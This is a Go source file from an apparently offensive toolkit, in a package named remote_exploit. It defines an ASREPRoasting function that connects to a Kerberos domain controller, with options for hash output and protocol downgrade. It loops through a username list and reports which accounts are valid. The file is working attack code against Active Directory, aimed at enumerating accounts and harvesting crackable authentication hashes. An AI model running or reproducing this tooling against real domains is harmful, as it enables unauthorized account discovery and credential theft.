package remote_exploit

import (
	"avant-garde/transport"
	"avant-garde/util"
	"fmt"
)

func ASREPRoasting(domain string, dc string, verbose bool, safemode bool, downgrade bool, hashfilename string, usernameslist string) {
	kOptions := transport.KerberosSessionOptions{
		Domain:           domain,
		DomainController: dc,
		Verbose:          verbose,
		SafeMode:         safemode,
		Downgrade:        downgrade,
		HashFilename:     hashfilename,
	}
	kSession, err := transport.NewKerberosSession(kOptions)
	if err != nil {
		fmt.Printf("Some error with NewKerberosSession - %v\n", err)
	}
	usernames, err := util.GetUsernames(usernameslist)
	if err != nil {
		fmt.Printf("Some error with GetUsernames -  %v", err)
	}
	for _, username := range usernames {
		usernamefull := fmt.Sprintf("%v@%v", username, kOptions.Domain)
		valid, err := kSession.TestUsername(username)
		if valid {
			if err != nil {
				// logger.Log.Noticef("[+] VALID USERNAME WITH ERROR:\t %s\t (%s)", username, err)
				fmt.Printf("[+] valid username with error:\t %s\t (%s)\n", username, err)
			} else {
				fmt.Printf("[+] valid username:\t %s\n", usernamefull)
			}
		} else if err != nil {
			// This is to determine if the error is "okay" or if we should abort everything
			ok, errorString := kSession.HandleKerbError(err)
			if kOptions.Verbose {
				if !ok {
					//logger.Log.Errorf("[!] %v - %v", usernamefull, errorString)
					fmt.Printf("[!] %v - %v\n", usernamefull, errorString)
					break
				} else {
					//logger.Log.Debugf("[!] %v - %v", usernamefull, errorString)
					fmt.Printf("[!] %v - %v\n", usernamefull, errorString)
				}
			}
		} else {
			//logger.Log.Debug("[!] Unknown behavior - %v", usernamefull)
			fmt.Printf("[!] Unknown behavior - %v\n", usernamefull)
		}
	}
}
